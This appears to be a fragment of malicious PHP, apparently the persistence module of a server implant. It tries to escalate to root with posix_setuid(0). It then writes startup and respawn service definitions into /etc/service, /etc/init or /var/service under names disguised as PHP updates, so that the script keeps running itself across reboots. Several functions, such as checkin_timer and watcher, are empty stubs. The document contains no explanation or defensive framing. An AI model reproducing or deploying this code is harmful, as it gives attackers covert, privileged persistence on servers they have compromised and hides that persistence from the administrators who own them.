<?php
ini_set("safe_mode", "0");
umask(0);
posix_setuid(0);
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);

function checkfs(){
    if (is_dir("/etc/service")){
        $f = fopen("/etc/service/php_update", "w");
        fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
        fflush($f);
        fclose($f);
    }elseif (is_dir("/etc/init/")){
        $ff = fopen("/etc/init/phpworker.conf", "w");
        fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec /usr/bin/php -f ". SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
        fflush($ff);
        fclose($ff);
    }elseif (is_dir("/var/service")){
        $ffe = fopen("/var/service/php_pear_update/run", "w");
        fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) ". SELF_SCRIPT ."'");
        fflush($ffe);
        fclose($ffe);
    }
}

function checkin_timer($time){

}

function fork_control(){

}

function watcher($lo){

}